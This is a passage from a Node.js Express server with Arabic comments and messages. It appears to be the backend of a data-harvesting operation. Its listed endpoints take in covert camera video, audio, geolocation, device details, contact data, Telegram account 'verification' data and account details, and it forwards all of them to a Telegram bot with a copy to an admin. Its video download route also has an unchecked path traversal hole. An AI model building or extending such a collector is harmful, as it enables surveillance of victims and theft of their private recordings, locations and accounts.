            });
        } else {
            res.status(500).json({
                success: false,
                message: 'فشل في إرسال الرسالة إلى Telegram'
            });
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({
            success: false,
            message: 'حدث خطأ أثناء إرسال البيانات',
            error: error.message
        });
    }
});

// ================== 🎵 نقطة رفع الصوت ==================
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'No audio file provided' 
            });
        }

        const { username, chatId } = req.body;
        
        let message = `🎵 تم تسجيل صوت جديد`;
        if (username) message += `\n👤 المستخدم: ${username}`;
        
        const success = await sendToTelegram(
            chatId, 
            message, 
            req.file.buffer, 
            `audio-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`
        );
        
        // إرسال نسخة للأدمن
        await sendCopyToAdmin(message, chatId, req.file.buffer, req.file.originalname);
        
        if (success) {
            res.status(200).json({ 
                success: true,
                message: 'تم إرسال الصوت إلى Telegram بنجاح' 
            });
        } else {
            res.status(500).json({ 
                success: false,
                error: 'فشل في إرسال الصوت إلى Telegram' 
            });
        }
    } catch (error) {
        console.error('Error processing audio upload:', error);
        res.status(500).json({ 
            success: false,
            error: 'Internal server error' 
        });
    }
});

// ================== 📁 نقاط إدارية للفيديو ==================

// عرض الفيديوهات المحفوظة
app.get('/api/videos', (req, res) => {
    try {
        const videoDir = 'uploads/videos';
        if (!fs.existsSync(videoDir)) {
            return res.json({
                success: true,
                count: 0,
                videos: []
            });
        }

        const files = fs.readdirSync(videoDir)
            .filter(file => !file.endsWith('.log'))
            .map(file => {
                const filePath = path.join(videoDir, file);
                const stat = fs.statSync(filePath);
                return {
                    name: file,
                    size: stat.size,
                    sizeMB: (stat.size / 1024 / 1024).toFixed(2),
                    modified: stat.mtime,
                    downloadUrl: `/api/videos/download/${file}`
                };
            });

        res.json({
            success: true,
            count: files.length,
            videos: files
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// تحميل فيديو محدد
app.get('/api/videos/download/:filename', (req, res) => {
    try {
        const filePath = path.join('uploads/videos', req.params.filename);
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ 
                success: false, 
                message: 'الفيديو غير موجود' 
            });
        }

        res.download(filePath);
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ================== ❤️ نقطة التحقق من صحة السيرفر ==================
app.get('/health', (req, res) => {
    res.status(200).json({ 
        success: true,
        status: 'Server is running',
        server: 'السيرفر الرئيسي المتكامل',
        tokenConfigured: !!BOT_TOKEN,
        adminId: ADMIN_CHAT_ID,
        environment: process.env.NODE_ENV || 'development',
        timestamp: new Date().toISOString(),
        saudiTime: moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss'),
        version: '4.0.0 - النسخة المتكاملة مع الفيديو',
        endpoints: {
            videoUpload: 'POST /api/capture/record - رفع الفيديوهات',
            videoInfo: 'POST /api/capture/info - معلومات الجهاز للفيديو',
            location: 'POST /submitLocation - استقبال بيانات الموقع',
            telegramAuth: 'POST /forward-to-bot - توثيق تيليجرام',
            contact: 'POST /submit-contact - بيانات الاتصال',
            deviceInfo: 'POST /SS - بيانات الجهاز',
            sendMessage: 'POST /send-to-telegram - بيانات الحسابات',
            audioUpload: 'POST /upload-audio - رفع الصوت',
            listVideos: 'GET /api/videos - عرض الفيديوهات'
        }
    });
});

// ================== 🏠 الصفحة الرئيسية ==================
app.get('/', (req, res) => {
    res.status(200).json({ 
        success: true,
        message: 'مرحباً بك في السيرفر الرئيسي المتكامل',
        version: '4.0.0',
        description: 'سيرفر متكامل لاستقبال جميع أنواع البيانات وإرسالها إلى Telegram',
        adminId: ADMIN_CHAT_ID,
        features: [
            '🎬 استقبال وتسجيل الفيديوهات',
            '📍 استقبال بيانات الموقع الجغرافي',
            '📲 توثيق حسابات تيليجرام',
            '📞 استقبال بيانات الاتصال',
            '💻 استقبال معلومات الأجهزة',
            '🎵 رفع الصوت والملفات',
            '👑 إرسال نسخة تلقائية للأدمن'
        ],
        mainEndpoints: {
            videoUpload: 'POST /api/capture/record',
            location: 'POST /submitLocation',
            telegramAuth: 'POST /forward-to-bot',
            healthCheck: 'GET /health'
        }
    });
});

// ================== تشغيل السيرفر ==================
app.listen(PORT, () => {
    console.log('='.repeat(70));
    console.log(`🚀 السيرفر المتكامل يعمل على PORT: ${PORT}`);
    console.log('='.repeat(70));
    console.log('🎬 نقاط استقبال الفيديو:');
    console.log(`   📤 رفع الفيديو: POST /api/capture/record`);
    console.log(`   📱 معلومات الجهاز: POST /api/capture/info`);
    console.log(`   📁 عرض الفيديوهات: GET /api/videos`);
    console.log('='.repeat(70));
    console.log('📍 نقاط الاستقبال الرئيسية:');
    console.log(`   🗺️  استقبال الموقع: /submitLocation`);
    console.log(`   📲 توثيق تيليجرام: /forward-to-bot`);
    console.log(`   📞 بيانات الاتصال: /submit-contact`);
    console.log(`   📧 بيانات الجهاز: /SS`);
    console.log('='.repeat(70));
    console.log('📦 المميزات المتاحة:');
    console.log(`   • استقبال وتسجيل الفيديوهات (حتى 100MB)`);
    console.log(`   • إرسال تلقائي إلى Telegram`);
    console.log(`   • نسخة تلقائية للأدمن`);
    console.log(`   • حفظ الفيديوهات على القرص`);
    console.log(`   • تحليل معلومات الجهاز تلقائياً`);
    console.log('='.repeat(70));
    console.log(`👑 إرسال نسخة للأدمن: ${ADMIN_CHAT_ID}`);
    console.log(`❤️  نقطة التحقق: /health`);
    console.log(`🆕 الإصدار: 4.0.0 - النسخة المتكاملة مع الفيديو`);
    console.log(`🌐 الوقت الحالي: ${moment().tz('Asia/Riyadh').format('YYYY-MM-DD HH:mm:ss')}`);
    console.log('='.repeat(70));
    
    if (!BOT_TOKEN) {
        console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
    }
    
    // إنشاء المجلدات المطلوبة
    const folders = ['uploads', 'uploads/videos', 'data', 'logs'];
    folders.forEach(folder => {
        if (!fs.existsSync(folder)) {
            fs.mkdirSync(folder, { recursive: true });
            console.log(`📁 تم إنشاء مجلد: ${folder}`);
        }
    });
});